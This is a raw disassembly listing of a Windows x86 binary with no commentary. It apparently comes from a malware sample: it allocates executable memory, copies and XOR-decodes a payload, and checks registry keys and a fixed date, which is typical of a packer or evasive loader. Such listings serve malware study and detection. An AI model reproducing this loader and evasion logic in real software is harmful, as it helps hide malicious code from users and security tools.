0x0041ad30:	pushl	%ebp	; from: 0x0041b149(MAY), 0x0041b1fc(MAY)
0x0041ad31:	movl	%esp, %ebp
0x0041ad33:	subl	$0xc, %esp
0x0041ad36:	movl	$0x1e4dc, -8(%ebp)
0x0041ad3d:	movl	$0x3000, -12(%ebp)
0x0041ad44:	movl	$0x40, -4(%ebp)
0x0041ad4b:	movl	-4(%ebp), %eax
0x0041ad4e:	pushl	%eax
0x0041ad4f:	movl	-12(%ebp), %ecx
0x0041ad52:	pushl	%ecx
0x0041ad53:	movl	0x8(%ebp), %edx
0x0041ad56:	pushl	%edx
0x0041ad57:	pushl	$0x0
0x0041ad59:	pushl	$0xffffffff
0x0041ad5b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000250(MAY)
0x0041ad61:	movl	%ebp, %esp
0x0041ad63:	popl	%ebp
0x0041ad64:	ret	; targets: 0x0041b14e(MAY), 0x0041b201(MAY)

0x0041ad70:	pushl	%ebp	; from: 0x0041b15e(MAY)
0x0041ad71:	movl	%esp, %ebp
0x0041ad73:	popl	%ebp
0x0041ad74:	ret	; targets: 0x0041b163(MAY)

0x0041ad80:	pushl	%ebp	; from: 0x0041b17c(MAY)
0x0041ad81:	movl	%esp, %ebp
0x0041ad83:	subl	$0x8, %esp
0x0041ad86:	movl	0x8(%ebp), %eax
0x0041ad89:	movl	%eax, -4(%ebp)
0x0041ad8c:	movl	0xc(%ebp), %ecx
0x0041ad8f:	movl	%ecx, -8(%ebp)
0x0041ad92:	movl	-4(%ebp), %edx
0x0041ad95:	cmpl	-8(%ebp), %edx
0x0041ad98:	jae	0x0041ada1	; targets: 0x0041ada1(MAY), 0x0041ad9a(MAY)
0x0041ad9a:	movl	-4(%ebp), %eax	; from: 0x0041ad98(MAY)
0x0041ad9d:	jmp	0x0041ada4	; targets: 0x0041ada4(MAY)
0x0041ada1:	movl	-8(%ebp), %eax	; from: 0x0041ad98(MAY)
0x0041ada4:	movl	%ebp, %esp	; from: 0x0041ad9d(MAY)
0x0041ada6:	popl	%ebp
0x0041ada7:	ret	; targets: 0x0041b181(MAY)

0x0041adb0:	pushl	%ebp	; from: 0x0041b08f(MAY)
0x0041adb1:	movl	%esp, %ebp
0x0041adb3:	movl	$0x401004, 0x0041ec64
0x0041adbd:	popl	%ebp
0x0041adbe:	ret	; targets: 0x0041b094(MAY)

0x0041adc0:	pushl	%ebp	; from: 0x0041b1e2(MAY)
0x0041adc1:	movl	%esp, %ebp
0x0041adc3:	movl	$0x41a258, 0x0041ec64
0x0041adcd:	popl	%ebp
0x0041adce:	ret	; targets: 0x0041b1e7(MAY)

0x0041add0:	pushl	%ebp	; from: 0x0041b1ed(MAY), 0x0041b13a(MAY)
0x0041add1:	movl	%esp, %ebp
0x0041add3:	movl	0x8(%ebp), %eax
0x0041add6:	movl	-4(%eax), %eax
0x0041add9:	popl	%ebp
0x0041adda:	ret	; targets: 0x0041b13f(MAY), 0x0041b1f2(MAY)

0x0041ae60:	pushl	%ebp	; from: 0x0041b1cc(MAY)
0x0041ae61:	movl	%esp, %ebp
0x0041ae63:	subl	$0x28, %esp
0x0041ae66:	movl	$0x11cb, -8(%ebp)
0x0041ae6d:	movl	$0x0, -16(%ebp)
0x0041ae74:	jmp	0x0041ae7f	; targets: 0x0041ae7f(MAY)
0x0041ae7f:	movl	-16(%ebp), %ecx	; from: 0x0041ae74(MAY)
0x0041ae82:	cmpl	0xc(%ebp), %ecx
0x0041ae85:	jae	0x0041af57	; targets: 0x0041af57(MAY), 0x0041ae8b(MAY)
0x0041ae8b:	movl	$0x11cb, -8(%ebp)	; from: 0x0041ae85(MAY)
0x0041ae92:	cmpl	$0x0, -16(%ebp)
0x0041ae96:	jne	0x0041aee8	; targets: 0x0041ae98(MAY)
0x0041ae98:	pushl	$0x104	; from: 0x0041ae96(MAY)
0x0041ae9d:	pushl	$0x41ec68
0x0041aea2:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000270(MAY)
0x0041aea8:	pushl	$0x41c000
0x0041aead:	pushl	$0x41ec68
0x0041aeb2:	call	lstrcatA@kernel32.dll	; targets: 0xff000290(MAY)
0x0041aeb8:	pushl	$0x0
0x0041aeba:	pushl	$0x80
0x0041aebf:	pushl	$0x3
0x0041aec1:	pushl	$0x0
0x0041aec3:	pushl	$0x3
0x0041aec5:	pushl	$0x1
0x0041aec7:	pushl	$0x41ec68
0x0041aecc:	call	CreateFileA@kernel32.dll	; targets: 0xff000110(MAY)
0x0041aed2:	movl	%eax, -4(%ebp)
0x0041aed5:	cmpl	$0xffffffff, -4(%ebp)
0x0041aed9:	je	0x0041aee1	; targets: 0x0041aedb(MAY), 0x0041aee1(MAY)
0x0041aedb:	cmpl	$0x0, -4(%ebp)	; from: 0x0041aed9(MAY)
0x0041aedf:	jne	0x0041aee8	; targets: 0x0041aee1(MAY), 0x0041aee8(MAY)
0x0041aee1:	movl	$0x42, %eax	; from: 0x0041aedf(MAY), 0x0041aed9(MAY)
0x0041aee6:	jmp	0x0041af57	; targets: 0x0041af57(MAY)
0x0041aee8:	movl	$0x11cb, -8(%ebp)	; from: 0x0041aedf(MAY)
0x0041aeef:	movl	-16(%ebp), %edx
0x0041aef2:	addl	$0x6296, %edx
0x0041aef8:	movl	%edx, 0x0041ed6c
0x0041aefe:	movl	0x8(%ebp), %eax
0x0041af01:	addl	-16(%ebp), %eax
0x0041af04:	movl	(%eax), %ecx
0x0041af06:	addl	-16(%ebp), %ecx
0x0041af09:	movl	0x8(%ebp), %edx
0x0041af0c:	addl	-16(%ebp), %edx
0x0041af0f:	movl	%ecx, (%edx)
0x0041af11:	movl	-12(%ebp), %eax
0x0041af14:	movl	%eax, -20(%ebp)
0x0041af17:	movl	$0x11cb, -8(%ebp)
0x0041af1e:	movl	0x0041ed6c, %ecx
0x0041af24:	movl	%ecx, -36(%ebp)
0x0041af27:	movl	-36(%ebp), %edx
0x0041af2a:	movl	%edx, -32(%ebp)
0x0041af2d:	movl	-32(%ebp), %eax
0x0041af30:	movl	%eax, -28(%ebp)
0x0041af33:	movl	-28(%ebp), %ecx
0x0041af36:	movl	%ecx, -24(%ebp)
0x0041af39:	movl	-24(%ebp), %edx
0x0041af3c:	movl	%edx, -40(%ebp)
0x0041af3f:	movl	0x8(%ebp), %eax
0x0041af42:	addl	-16(%ebp), %eax
0x0041af45:	movl	(%eax), %ecx
0x0041af47:	xorl	-24(%ebp), %ecx
0x0041af57:	movl	%ebp, %esp	; from: 0x0041aee6(MAY), 0x0041ae85(MAY)
0x0041af59:	popl	%ebp
0x0041af5a:	ret	; targets: 0x0041b1d1(MAY)

0x0041afc0:	pushl	%ebp	; from: 0x0041b068(MAY), 0x0041b0fd(MAY)
0x0041afc1:	movl	%esp, %ebp
0x0041afc3:	subl	$0x8, %esp
0x0041afc6:	movl	$0x41c018, -4(%ebp)
0x0041afcd:	leal	-8(%ebp), %eax
0x0041afd0:	pushl	%eax
0x0041afd1:	pushl	$0x20019
0x0041afd6:	pushl	$0x0
0x0041afd8:	pushl	$0x41ec5c
0x0041afdd:	pushl	$0x80000002
0x0041afe2:	call	0x0041ed70	; targets: 0xff000350(MAY)
0x0041afe8:	testl	%eax, %eax
0x0041afea:	je	0x0041aff3	; targets: 0x0041afec(MAY), 0x0041aff3(MAY)
0x0041afec:	xorl	%eax, %eax	; from: 0x0041afea(MAY)
0x0041afee:	jmp	0x0041b094	; targets: 0x0041b094(MAY)
0x0041aff3:	leal	-8(%ebp), %ecx	; from: 0x0041afea(MAY)
0x0041aff6:	pushl	%ecx
0x0041aff7:	pushl	$0x20019
0x0041affc:	pushl	$0x0
0x0041affe:	pushl	$0x41ec60
0x0041b003:	pushl	$0x80000002
0x0041b008:	call	0x0041ed70	; targets: 0xff000350(MAY)
0x0041b00e:	testl	%eax, %eax
0x0041b010:	je	0x0041b016	; targets: 0x0041b016(MAY), 0x0041b012(MAY)
0x0041b012:	xorl	%eax, %eax	; from: 0x0041b010(MAY)
0x0041b014:	jmp	0x0041b094	; targets: 0x0041b094(MAY)
0x0041b016:	movl	$0x53, %edx	; from: 0x0041b010(MAY)
0x0041b01b:	movl	-4(%ebp), %eax
0x0041b01e:	movw	%dx, (%eax)
0x0041b021:	leal	-8(%ebp), %ecx
0x0041b024:	pushl	%ecx
0x0041b025:	pushl	$0x20019
0x0041b02a:	pushl	$0x0
0x0041b02c:	movl	-4(%ebp), %edx
0x0041b02f:	pushl	%edx
0x0041b030:	movl	-8(%ebp), %eax
0x0041b033:	pushl	%eax
0x0041b034:	call	0x0041ed70	; targets: 0xff000350(MAY)
0x0041b03a:	testl	%eax, %eax
0x0041b03c:	je	0x0041b042	; targets: 0x0041b03e(MAY), 0x0041b042(MAY)
0x0041b03e:	xorl	%eax, %eax	; from: 0x0041b03c(MAY)
0x0041b040:	jmp	0x0041b094	; targets: 0x0041b094(MAY)
0x0041b042:	leal	-8(%ebp), %ecx	; from: 0x0041b03c(MAY)
0x0041b045:	pushl	%ecx
0x0041b046:	pushl	$0x20019
0x0041b04b:	pushl	$0x0
0x0041b04d:	pushl	$0x41c030
0x0041b052:	movl	-8(%ebp), %edx
0x0041b055:	pushl	%edx
0x0041b056:	call	0x0041ed70	; targets: 0xff000350(MAY)
0x0041b05c:	testl	%eax, %eax
0x0041b05e:	je	0x0041b06d	; targets: 0x0041b060(MAY), 0x0041b06d(MAY)
0x0041b060:	pushl	$0x1	; from: 0x0041b05e(MAY)
0x0041b062:	pushl	$0x1
0x0041b064:	pushl	$0x1
0x0041b066:	pushl	$0x1
0x0041b068:	call	0x0041afc0	; targets: 0x0041afc0(MAY)
0x0041b06d:	leal	-8(%ebp), %eax	; from: 0x0041b05e(MAY), 0x0041b097(MAY)
0x0041b070:	pushl	%eax
0x0041b071:	pushl	$0x20019
0x0041b076:	pushl	$0x0
0x0041b078:	pushl	$0x41c0a8
0x0041b07d:	movl	-8(%ebp), %ecx
0x0041b080:	pushl	%ecx
0x0041b081:	call	0x0041ed70	; targets: 0xff000350(MAY)
0x0041b087:	testl	%eax, %eax
0x0041b089:	jne	0x0041b08f	; targets: 0x0041b08f(MAY), 0x0041b08b(MAY)
0x0041b08b:	xorl	%eax, %eax	; from: 0x0041b089(MAY)
0x0041b08d:	jmp	0x0041b094	; targets: 0x0041b094(MAY)
0x0041b08f:	call	0x0041adb0	; targets: 0x0041adb0(MAY)	; from: 0x0041b089(MAY)
0x0041b094:	movl	%ebp, %esp	; from: 0x0041afee(MAY), 0x0041b014(MAY), 0x0041b040(MAY), 0x0041adbe(MAY), 0x0041b08d(MAY)
0x0041b096:	popl	%ebp
0x0041b097:	ret	$0x10	; targets: 0x0041b102(MAY), 0x0041b06d(MAY)


start:
0x0041b0a0:	pushl	%ebp
0x0041b0a1:	movl	%esp, %ebp
0x0041b0a3:	subl	$0x70, %esp
0x0041b0a6:	pusha	
0x0041b0a7:	movl	%ebp, 0x0041ed74
0x0041b0ad:	movl	$0x0, -60(%ebp)
0x0041b0b4:	movl	$0x80000002, -80(%ebp)
0x0041b0bb:	movl	$0xe1d58000, -8(%ebp)
0x0041b0c2:	movl	$0x1a8e79f, -4(%ebp)
0x0041b0c9:	movl	RegOpenKeyExW@advapi32.dll, %eax
0x0041b0ce:	movl	%eax, 0x0041ed70
0x0041b0d3:	leal	-84(%ebp), %ecx
0x0041b0d6:	pushl	%ecx
0x0041b0d7:	leal	-88(%ebp), %edx
0x0041b0da:	pushl	%edx
0x0041b0db:	leal	-8(%ebp), %eax
0x0041b0de:	pushl	%eax
0x0041b0df:	call	FileTimeToDosDateTime@kernel32.dll	; targets: 0xff000130(MAY)
0x0041b0e5:	movzwl	-88(%ebp), %ecx
0x0041b0e9:	cmpl	$0x21, %ecx
0x0041b0ec:	je	0x0041b0f5	; targets: 0x0041b0f5(MAY), 0x0041b0ee(MAY)
0x0041b0ee:	xorl	%eax, %eax	; from: 0x0041b0ec(MAY)
0x0041b0f0:	jmp	0x0041b2ec	; targets: 0x0041b2ec(MAY)
0x0041b0f5:	pushl	$0x1	; from: 0x0041b0ec(MAY)
0x0041b0f7:	pushl	$0x1
0x0041b0f9:	pushl	$0x1
0x0041b0fb:	pushl	$0x1
0x0041b0fd:	call	0x0041afc0	; targets: 0x0041afc0(MAY)
0x0041b102:	movl	$0x0, -20(%ebp)	; from: 0x0041b097(MAY)
0x0041b109:	movl	$0x64, -52(%ebp)
0x0041b110:	movl	$0x12, -28(%ebp)
0x0041b117:	movl	$0x0, -60(%ebp)
0x0041b11e:	movl	$0x0, -36(%ebp)
0x0041b125:	movl	$0x1, -48(%ebp)
0x0041b12c:	movl	$0x3, -24(%ebp)
0x0041b133:	movl	0x0041ec64, %edx
0x0041b139:	pushl	%edx
0x0041b13a:	call	0x0041add0	; targets: 0x0041add0(MAY)
0x0041b13f:	addl	$0x4, %esp	; from: 0x0041adda(MAY)
0x0041b142:	movl	%eax, -64(%ebp)
0x0041b145:	movl	-64(%ebp), %eax
0x0041b148:	pushl	%eax
0x0041b149:	call	0x0041ad30	; targets: 0x0041ad30(MAY)
0x0041b14e:	addl	$0x4, %esp	; from: 0x0041ad64(MAY)
0x0041b151:	movl	%eax, -56(%ebp)
0x0041b154:	movl	-64(%ebp), %ecx
0x0041b157:	pushl	%ecx
0x0041b158:	pushl	$0x0
0x0041b15a:	movl	-56(%ebp), %edx
0x0041b15d:	pushl	%edx
0x0041b15e:	call	0x0041ad70	; targets: 0x0041ad70(MAY)
0x0041b163:	addl	$0xc, %esp	; from: 0x0041ad74(MAY)
0x0041b166:	movl	-64(%ebp), %eax
0x0041b169:	movl	%eax, -72(%ebp)
0x0041b16c:	movl	-60(%ebp), %ecx	; from: 0x0041b1c2(MAY)
0x0041b16f:	cmpl	-64(%ebp), %ecx
0x0041b172:	jae	0x0041b1c4	; targets: 0x0041b174(MAY), 0x0041b1c4(MAY)
0x0041b174:	movl	-72(%ebp), %edx	; from: 0x0041b172(MAY)
0x0041b177:	pushl	%edx
0x0041b178:	movl	-52(%ebp), %eax
0x0041b17b:	pushl	%eax
0x0041b17c:	call	0x0041ad80	; targets: 0x0041ad80(MAY)
0x0041b181:	addl	$0x8, %esp	; from: 0x0041ada7(MAY)
0x0041b184:	movl	%eax, -76(%ebp)
0x0041b187:	movl	-76(%ebp), %ecx
0x0041b18a:	pushl	%ecx
0x0041b18b:	movl	0x0041ec64, %edx
0x0041b191:	addl	-36(%ebp), %edx
0x0041b194:	pushl	%edx
0x0041b195:	movl	-56(%ebp), %eax
0x0041b198:	addl	-60(%ebp), %eax
0x0041b19b:	pushl	%eax
0x0041b19c:	call	0x0041b8e2	; targets: 0x0041b8e2(MAY)
0x0041b1a1:	addl	$0xc, %esp
0x0041b1a4:	movl	-28(%ebp), %ecx
0x0041b1a7:	addl	-52(%ebp), %ecx
0x0041b1aa:	addl	-36(%ebp), %ecx
0x0041b1ad:	movl	%ecx, -36(%ebp)
0x0041b1b0:	movl	-60(%ebp), %edx
0x0041b1b3:	addl	-52(%ebp), %edx
0x0041b1b6:	movl	%edx, -60(%ebp)
0x0041b1b9:	movl	-72(%ebp), %eax
0x0041b1bc:	subl	-76(%ebp), %eax
0x0041b1bf:	movl	%eax, -72(%ebp)
0x0041b1c2:	jmp	0x0041b16c	; targets: 0x0041b16c(MAY)
0x0041b1c4:	movl	-64(%ebp), %ecx	; from: 0x0041b172(MAY)
0x0041b1c7:	pushl	%ecx
0x0041b1c8:	movl	-56(%ebp), %edx
0x0041b1cb:	pushl	%edx
0x0041b1cc:	call	0x0041ae60	; targets: 0x0041ae60(MAY)
0x0041b1d1:	addl	$0x8, %esp	; from: 0x0041af5a(MAY)
0x0041b1d4:	movl	$0x0, -36(%ebp)
0x0041b1db:	movl	$0x0, -96(%ebp)
0x0041b1e2:	call	0x0041adc0	; targets: 0x0041adc0(MAY)
0x0041b1e7:	movl	0x0041ec64, %eax	; from: 0x0041adce(MAY)
0x0041b1ec:	pushl	%eax
0x0041b1ed:	call	0x0041add0	; targets: 0x0041add0(MAY)
0x0041b1f2:	addl	$0x4, %esp	; from: 0x0041adda(MAY)
0x0041b1f5:	movl	%eax, -100(%ebp)
0x0041b1f8:	movl	-100(%ebp), %ecx
0x0041b1fb:	pushl	%ecx
0x0041b1fc:	call	0x0041ad30	; targets: 0x0041ad30(MAY)
0x0041b201:	addl	$0x4, %esp	; from: 0x0041ad64(MAY)
0x0041b2ec:	movl	%ebp, %esp	; from: 0x0041b0f0(MAY)
0x0041b2ee:	popl	%ebp
0x0041b2ef:	ret	; targets: 0xfee70000(MAY)

0x0041b8e2:	jmp	memcpy@msvcrt.dll	; targets: 0xff000360(MAY)	; from: 0x0041b19c(MAY)
